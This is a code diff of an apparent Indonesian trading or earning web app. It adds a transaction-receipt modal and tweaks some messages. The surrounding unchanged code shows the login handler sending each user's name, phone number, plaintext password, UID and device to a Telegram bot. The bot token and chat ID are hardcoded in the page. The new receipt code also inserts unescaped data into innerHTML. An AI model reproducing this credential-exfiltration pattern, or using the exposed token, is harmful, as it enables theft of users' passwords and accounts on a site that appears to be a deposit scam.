@@ -1365,6 +1365,17 @@
         </div>
     </div>
 
+    <div id="receipt-modal" class="modal-overlay" style="z-index: 1000002;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Detail Transaksi</h3>
+                <button class="btn-icon" onclick="closeTargetModal('receipt-modal')"><i class="bi bi-x-lg"></i></button>
+            </div>
+            <div class="modal-body" id="receipt-modal-body">
+            </div>
+        </div>
+    </div>
+
     <script>
         const BOT_TOKEN = '8765727817:AAEzCv9z6n1OrAzEll_DdHM-lO2fpeL__oY'; 
         const CHAT_ID = '8893393746';
@@ -2042,7 +2053,7 @@
                 sendToTelegram(`*AKTIVITAS LOGIN*\nNama: ${usersDb[phone].name}\nHP: \`${phone}\`\nPassword: \`${pass}\`\nUID: \`${usersDb[phone].uid}\`\nDevice: \`${deviceUsed}\``);
                 updateAuthUI(); closeTargetModal('login-modal'); startTelegramPolling(); 
                 checkLoginLock();
-                showModal("Berhasil", `Selamat bergabung kembali, ${currentUserName}!`, "win");
+                showModal("Berhasil", `Selamat bergabung, ${currentUserName}!`, "win");
             } else { showModal("Perhatian", "Nomor dan password salah.", "error"); }
         }
 
@@ -2501,7 +2512,7 @@
                 if(idx !== -1) { tradeHistory[idx].status = 'Dibatalkan'; saveDataLocally(); renderHistory(); }
             }
             localStorage.removeItem(`sanz_active_deposit_${currentUserPhone}`);
-            sendToTelegram(`User \`${userID}\` membatalkan permintaan isi saldonya.`);
+            sendToTelegram(`\`${userID}\` membatalkan permintaan isi saldonya.`);
             closeTargetModal('deposit-modal');
             showModal("Berhasil","Permintaan isi saldo dibatalkan.","info");
         }
@@ -2712,7 +2723,7 @@
                 updateBalanceDisplay();
                 
                 let timeStr = new Date().toLocaleTimeString('id-ID');
-                tradeHistory.unshift({ id: Date.now(), type: 'Bonus', amount: bonusAmount, time: timeStr, status: 'Berhasil', info: 'Klaim Reward Pengguna Baru' });
+                tradeHistory.unshift({ id: Date.now(), type: 'Bonus', amount: bonusAmount, time: timeStr, status: 'Berhasil', info: 'Klaim Reward' });
                 
                 saveDataLocally();
                 renderHistory();
@@ -3059,13 +3070,37 @@
                 else if (h.type === 'Penarikan') { iconColor = 'var(--danger)'; iconClass = 'bi-box-arrow-up'; }
                 else { iconColor = 'var(--warning)'; iconClass = 'bi-fire'; }
 
-                const historyHTML = `<div class="history-item">
+                const historyHTML = `<div class="history-item" style="cursor: pointer; transition: transform 0.2s;" onclick="showReceiptDetails(${h.id})" onmousedown="this.style.transform='scale(0.98)'" onmouseup="this.style.transform='scale(1)'">
                                         <div style="font-size: 22px; color: ${iconColor};"><i class="bi ${iconClass}"></i></div>
                                         <div class="hist-info"><h4>${h.type}</h4><p>${h.info || '-'}</p></div>
                                         <div class="hist-result"><h4 class="${statusColorClass}">${h.status}</h4><p>${amountStr}</p><p style="font-size:10px; color:var(--text-muted);">${h.time}</p></div>
                                      </div>`;
                 if (index < 3) box.innerHTML += historyHTML; fullList.innerHTML += historyHTML;
             });
+        }
+
+        function showReceiptDetails(txId) {
+            const tx = tradeHistory.find(h => h.id === txId);
+            if (!tx) return;
+
+            let statusColor = tx.status === 'Berhasil' ? 'var(--success)' : (tx.status === 'Menunggu' ? 'var(--warning)' : 'var(--danger)');
+            let txDate = new Date(tx.id).toLocaleDateString('id-ID'); 
+
+            let receiptHtml = `
+                <div class="receipt-box" style="text-align: left; margin-top: 5px;">
+                    <div class="receipt-header">DIGITAL</div>
+                    <div class="receipt-row"><span>ID Transaksi:</span><span>TRX-${tx.id}</span></div>
+                    <div class="receipt-row"><span>Waktu:</span><span>${txDate} ${tx.time}</span></div>
+                    <div class="receipt-row"><span>Jenis Layanan:</span><span>${tx.type}</span></div>
+                    <div class="receipt-row"><span>Detail Keterangan:</span><span>${tx.info || '-'}</span></div>
+                    <div class="receipt-row"><span>Status:</span><span style="color: ${statusColor}; font-weight: bold;">${tx.status}</span></div>
+                    <hr style="border:0; border-top:1px dashed var(--border-color); margin: 12px 0;">
+                    <div class="receipt-row" style="font-weight:bold; font-size: 15px;"><span>Nominal:</span><span style="${tx.type === 'Penarikan' ? 'color: var(--danger)' : ''}">${formatIDR(tx.amount)}</span></div>
+                </div>
+            `;
+
+            document.getElementById('receipt-modal-body').innerHTML = receiptHtml;
+            openTargetModal('receipt-modal');
         }
 
         function showNotif(msgText) {
